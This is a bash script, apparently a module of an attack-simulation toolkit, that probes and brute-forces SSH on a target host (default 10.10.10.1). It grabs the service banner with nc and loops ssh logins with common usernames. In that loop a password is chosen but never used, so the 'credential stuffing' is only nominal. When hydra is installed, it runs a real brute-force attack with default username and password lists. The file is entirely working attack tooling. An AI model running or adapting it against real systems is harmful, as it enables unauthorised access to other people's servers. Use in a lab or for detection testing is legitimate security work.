#!/usr/bin/env bash
# attacks/ssh.sh — SSH brute-force and probing module
set -euo pipefail

TARGET="${SSH_TARGET:-${TARGET:-10.10.10.1}}"
PORT="${SSH_PORT:-22}"
ATTEMPTS="${SSH_ATTEMPTS:-20}"

echo "[ssh] Starting SSH module → $TARGET:$PORT"

# 1. Banner grab
echo "[ssh] Banner grab..."
timeout 3 bash -c "echo '' | nc -w 2 $TARGET $PORT" 2>/dev/null || true

# 2. Simulated brute force with parametric credentials
echo "[ssh] Simulated credential stuffing ($ATTEMPTS attempts)..."
USERLIST=(admin root user ubuntu pi deploy jenkins)
PASSLIST=(password 123456 admin root letmein changeme)

for i in $(seq 1 "$ATTEMPTS"); do
    u="${USERLIST[$((RANDOM % ${#USERLIST[@]}))]}"
    p="${PASSLIST[$((RANDOM % ${#PASSLIST[@]}))]}"
    timeout 2 ssh -o BatchMode=yes -o ConnectTimeout=2 \
        -o StrictHostKeyChecking=no -p "$PORT" \
        "${u}@${TARGET}" -i /dev/null exit 2>/dev/null || true
done

# 3. Hydra (if available)
if command -v hydra >/dev/null 2>&1; then
    echo "[ssh] Hydra brute force (small list)..."
    echo -e "admin\nroot\nuser" > /tmp/ssh_users.txt
    echo -e "password\n123456\nadmin" > /tmp/ssh_pass.txt
    hydra -L /tmp/ssh_users.txt -P /tmp/ssh_pass.txt \
        -t 4 -f "$TARGET" ssh -s "$PORT" >/dev/null 2>&1 || true
    rm -f /tmp/ssh_users.txt /tmp/ssh_pass.txt
fi

echo "[ssh] Module complete."
